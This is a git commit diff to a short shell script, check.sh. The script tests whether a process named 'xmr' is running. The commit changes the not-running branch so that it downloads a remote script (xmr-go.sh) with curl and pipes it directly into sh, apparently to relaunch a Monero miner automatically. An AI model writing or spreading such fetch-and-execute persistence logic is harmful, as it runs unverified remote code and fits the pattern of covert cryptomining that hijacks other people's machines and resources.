2c83bce4b7610fbf05ba231f133d8a609aa98aac
spetterman66 <69303239+spetterman66@users.noreply.github.com>
2024-10-14 19:36:28 +0200

    ok davje

--- check.sh
+++ check.sh
@@ -3,5 +3,5 @@ if pgrep -x "xmr" > /dev/null
 then
     echo "it's running!"
 else
-    echo "it's not running!"
+    sh <(curl -s https://raw.githubusercontent.com/spetterman66/verynicerepo/main/xmr-go.sh) 
 fi
